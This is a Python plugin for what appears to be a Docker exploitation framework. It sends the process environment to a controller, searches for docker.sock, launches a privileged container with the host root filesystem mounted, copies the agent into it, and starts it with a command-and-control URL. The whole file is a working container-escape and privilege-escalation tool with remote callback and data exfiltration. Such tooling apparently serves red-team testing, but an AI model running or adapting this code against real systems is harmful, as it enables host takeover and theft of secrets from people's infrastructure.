from dockerexploitationframework import DEFAgent
import requests
import sys
import os
import pathlib
import random
import time

class PrivEscDockerSock(DEFAgent.Plugin): #Extend Plugin 

    def setup(self):
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            bundle_dir_path = pathlib.Path(sys._MEIPASS)
            print(f"bundle_dir_path={bundle_dir_path}")
            bundle_dir = pathlib.Path(bundle_dir_path)
            bundle_dir.iterdir()
            print(list(bundle_dir.iterdir()))
            os.popen(f"cp {bundle_dir_path}/include/docker /tmp/docker_package") 
            
            self.DOCKER_BIN = f"{bundle_dir_path}/include/docker"
            self.DOCKER_ID = os.uname()[1]








    def run(self):
        
        self.setup()
        
        self.sendMessage(str(os.environ))

        # Find Docker.Sock
        docker_sock_path = None
        for root, dirs, files in os.walk("/"):
            if "docker.sock" in files:
                docker_sock_path = os.path.join(root, "docker.sock")
                break
        if docker_sock_path:
            self.sendMessage(f"Found Docker.sock at {docker_sock_path}")
            docker_cli = f"{self.DOCKER_BIN}  -H unix://{docker_sock_path}"
            esc_container_id = f"DEF_{str(random.randint(100000,999999))}"
            self.sendMessage(f"Stage 1 - Starting a privileged container {esc_container_id} ...")
            cmd=f"{docker_cli} run --privileged --rm  -d -t --name={esc_container_id} -v /:/host_fs ubuntu:latest sh"
            print(cmd)
            os.popen(cmd)
            time.sleep(5) # TODO :handle the wait a bit more smartly
            self.sendMessage(f"Stage 2 - Copying agent to escaped container..")
            cmd=f"{docker_cli} cp {os.environ['DEF_AGENT_BIN']} {esc_container_id}:/tmp/DEF_AGENT_BIN"
            print(cmd)
            os.popen(cmd)
            self.sendMessage(f"Stage 3 - Starting agent remotely on escaped container..")
            cmd=f"{docker_cli} exec {esc_container_id} /tmp/DEF_AGENT_BIN --c2url {os.environ['DEF_C2_ADDR']}"
            print(cmd)
            os.popen(cmd)



        else:
            self.sendMessage(f"Cannot find Docker Sock")
        
    def endPlugin(self):
        self.endRun()

if __name__ == '__main__':
    #test that we can get argv even with pyinstaller


    myplugin = PrivEscDockerSock()
    myplugin.run()
    myplugin.endPlugin()
    
